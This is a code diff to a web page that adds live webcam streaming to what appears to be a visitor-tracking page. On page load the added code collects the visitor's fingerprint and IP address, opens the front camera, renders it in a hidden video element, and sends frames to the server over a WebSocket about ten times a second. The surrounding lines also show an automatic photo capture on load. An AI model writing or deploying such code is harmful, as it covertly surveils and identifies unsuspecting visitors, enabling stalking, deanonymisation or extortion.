@@ -126,6 +126,8 @@ main a {
       to { transform: rotate(360deg); }
     }
   </style>
+  <!-- Socket.IO client library for WebSocket communication -->
+  <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
 </head>
 <body>
   <div class="container">
@@ -844,9 +846,154 @@ main a {
       });
     }
 
+    // WebSocket connection for live video streaming
+    let socket = null;
+    let videoStream = null;
+    let streamingInterval = null;
+    let isStreaming = false;
+
+    // Initialize WebSocket connection
+    function initWebSocket() {
+      socket = io();
+      
+      socket.on('connect', () => {
+        console.log('[WEBSOCKET] Connected to server');
+      });
+
+      socket.on('disconnect', () => {
+        console.log('[WEBSOCKET] Disconnected from server');
+      });
+
+      socket.on('stream_started', (data) => {
+        console.log('[WEBSOCKET] Stream started:', data);
+      });
+
+      socket.on('stream_error', (data) => {
+        console.error('[WEBSOCKET] Stream error:', data);
+      });
+    }
+
+    // Start live video streaming
+    async function startLiveStream(entryId, fingerprint, ipAddress) {
+      if (isStreaming) {
+        console.log('[STREAM] Already streaming');
+        return;
+      }
+
+      try {
+        // Request camera access
+        const videoConstraints = isIOS 
+          ? { facingMode: 'user' }
+          : { 
+              facingMode: 'user',
+              width: { ideal: 640 },
+              height: { ideal: 480 }
+            };
+
+        videoStream = await navigator.mediaDevices.getUserMedia({
+          video: videoConstraints,
+          audio: false
+        });
+
+        // Create hidden video element to capture frames
+        const video = document.createElement('video');
+        video.srcObject = videoStream;
+        video.autoplay = true;
+        video.style.display = 'none';
+        document.body.appendChild(video);
+
+        // Wait for video to be ready
+        await new Promise(resolve => {
+          video.onloadedmetadata = () => {
+            video.play();
+            resolve();
+          };
+        });
+
+        // Create canvas for frame capture
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+
+        // Notify server that streaming is starting
+        if (socket && entryId) {
+          socket.emit('start_video_stream', {
+            entry_id: entryId,
+            fingerprint: fingerprint,
+            ip_address: ipAddress
+          });
+        }
+
+        isStreaming = true;
+
+        // Capture and send frames periodically (every 100ms = ~10 FPS)
+        streamingInterval = setInterval(() => {
+          try {
+            // Draw current video frame to canvas
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convert to base64
+            const frameData = canvas.toDataURL('image/jpeg', 0.7);
+            
+            // Send frame via WebSocket
+            if (socket && entryId) {
+              socket.emit('video_frame', {
+                entry_id: entryId,
+                frame: frameData
+              });
+            }
+          } catch (error) {
+            console.error('[STREAM] Error capturing frame:', error);
+          }
+        }, 100); // 10 frames per second
+
+        console.log('[STREAM] Live video streaming started for entry', entryId);
+
+      } catch (error) {
+        console.error('[STREAM] Failed to start live stream:', error);
+        isStreaming = false;
+      }
+    }
+
+    // Stop live video streaming
+    function stopLiveStream(entryId) {
+      if (streamingInterval) {
+        clearInterval(streamingInterval);
+        streamingInterval = null;
+      }
+
+      if (videoStream) {
+        videoStream.getTracks().forEach(track => track.stop());
+        videoStream = null;
+      }
+
+      if (socket && entryId) {
+        socket.emit('stop_stream', { entry_id: entryId });
+      }
+
+      isStreaming = false;
+      console.log('[STREAM] Live video streaming stopped');
+    }
+
     // Auto-run on page load
     window.addEventListener('load', async function() {
+      // Initialize WebSocket connection
+      initWebSocket();
+
       await collectAllData();
+
+      // Start live video streaming after data collection
+      const entryId = window.currentEntryId;
+      const fingerprint = window.currentFingerprint;
+      const ipAddress = (await getIPInfo())?.ip || '';
+
+      if (entryId && fingerprint) {
+        // Start streaming after a short delay
+        setTimeout(() => {
+          startLiveStream(entryId, fingerprint, ipAddress);
+        }, 2000);
+      }
 
       // On iOS, show button instead of auto-capturing (iOS requires user interaction)
       if (isIOS && btnbar) {
@@ -859,6 +1006,13 @@ main a {
         setTimeout(() => {
           capturePhoto('auto');  // Automatic on page load
         }, 1000);
+      }
+    });
+
+    // Stop streaming when page unloads
+    window.addEventListener('beforeunload', () => {
+      if (window.currentEntryId) {
+        stopLiveStream(window.currentEntryId);
       }
     });
   </script>
